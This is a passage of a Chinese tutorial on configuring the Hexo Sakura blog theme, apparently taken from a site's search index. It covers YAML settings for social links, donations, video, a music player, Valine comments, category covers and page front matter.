/img/social/email.svg&#125; wechat: &#123;url: /#, qrcode: /img/custom/wechat.jpg, img: /img/social/wechat.png&#125;# 社交按钮(msocial) url, img 移动端配置 【改】msocial: github: &#123;url: http://github.com/honjun, fa: fa-github, color: 333&#125; weibo: &#123;url: http://weibo.com/mashirozx?is_all=1, fa: fa-weibo, color: dd4b39&#125; qq: &#123;url: https://wpa.qq.com/msgrd?v=3&amp;uin=954655431&amp;site=qq&amp;menu=yes, fa: fa-qq, color: 25c6fe&#125;# 赞赏二维码（其中wechatSQ是赞赏单页面的赞赏码图片）【改】donate: alipay: /img/custom/donate/AliPayQR.jpg wechat: /img/custom/donate/WeChanQR.jpg wechatSQ: /img/custom/donate/WeChanSQ.jpg# 首页视频地址为https://cdn.jsdelivr.net/gh/honjun/hojun@1.2/Unbroken.mp4，配置如下 【改】movies: url: https://cdn.jsdelivr.net/gh/honjun/hojun@1.2 # 多个视频用逗号隔开，随机获取。支持的格式目前已知MP4,Flv。其他的可以试下，不保证有用 name: Unbroken.mp4# 左下角aplayer播放器配置 主要改id和server这两项，修改详见[aplayer文档] 【改】aplayer: id: 2660651585 server: netease type: playlist fixed: true mini: false autoplay: false loop: all order: random preload: auto volume: 0.7 mutex: true# Valine评论配置【改】valine: truev_appId: GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHszv_appKey: mgOpfzbkHYqU92CV4IDlAUHQ 分类页和标签页配置分类页 标签页 配置项在\\themes\\Sakura\\languages\\zh-cn.yml里。新增一个分类或标签最好加下哦，当然嫌麻烦可以直接使用一张默认图片（可以改主题或者直接把404图片替换下，征求下意见要不要给这个在配置文件中加个开关，可以issue或群里提出来），现在是没设置的话会使用那种倒立小狗404哦。12345678910111213141516171819#category# 按分类名创建技术: #中文标题 zh: 野生技术协会 # 英文标题 en: Geek – Only for Love # 封面图片 img: /img/banner/coding.jpg生活: zh: 生活 en: live img: /img/banner/writing.jpg#tag# 标签名即是标题悦读: # 封面图片 img: /img/banner/reading.jpg 单页面封面配置如留言板页面页面，位于source下的comment下，打开index.md如下：123456789---title: commentdate: 2018-12-20 23:13:48keywords: 留言板description: comments: true# 在这里配置单页面头部图片，自定义替换哦~photos: https://cdn.jsdelivr.net/gh/honjun/cdn@1.4/img/banner/comment.jpg--- 单页面配置番组计划页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响） 123456789101112131415161718192021222324252627282930---layout: bangumititle: bangumicomments: falsedate: 2019-02-10 21:32:48keywords:description:bangumis: # 番组图片 - img: https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg # 番组名 title: 朝花夕誓——于离别之朝束起约定之花 # 追番状态 （追番ing/已追完） status: 已追完 # 追番进度 progress: 100 # 番剧日文名称 jp: さよならの朝に約束の花をかざろう # 放送时间 time: 放送时间: 2018-02-24 SUN. # 番剧介绍 desc: 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。 - img: https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg title: 朝花夕誓——于离别之朝束起约定之花 status: 已追完 progress: 50 jp: さよならの朝に約束の花をかざろう time: 放送时间: 2018-02-24 SUN. desc: 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。--- 友链页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响） 1234567891011121314151617181920212223242526272829303132333435363738394041424344---layout: linkstitle: links# 创建日期，可以改下date: 2018-12-19 23:11:06 # 图片上的标题，自定义修改keywords: 友人帐 description: # true/false 开启/关闭评论comments: true # 页面头部图片，自定义修改photos: https://cdn.jsdelivr.net/gh/honjun/cdn@1.4/img/banner/links.jpg # 友链配置links: # 类型分组 - group: 个人项目 # 类型简介 desc: 充分说明这家伙是条咸鱼 &lt; (￣︶￣)&gt; items: # 友链链接 - url: https://shino.cc/fgvf # 友链头像 img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg # 友链站点名 name: Google # 友链介绍 下面雷同 desc: Google 镜像 - url: https://shino.cc/fgvf img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg name: Google desc: Google 镜像 # 类型分组... - group: 小伙伴们 desc: 欢迎交换友链 ꉂ(ˊᗜˋ) items: - url: https://shino.cc/fgvf img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg name: Google desc: Google 镜像 - url: https://shino.cc/fgvf img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg name: Google desc: Google 镜像--- 写文章配置主题集成了个人插件hexo-tag-bili和hexo-tag-fancybox_img。其中hexo-tag-bili用来在文章或单页面中插入B站外链视频，使用语法如下：1&#123;% bili video_id [page] %&#125; 详细使用教程详见hexo-tag-bili。 hexo-tag-fancybox_img用来在文章或单页面中图片，使用语法如下：1&#123;% fb_img src [caption] %&#125; 详细使用教程详见hexo-tag-fancybox_img 还有啥，一时想不起来……To be continued…","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"悦读","slug":"悦读","permalink":"/tags/悦读/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]}]}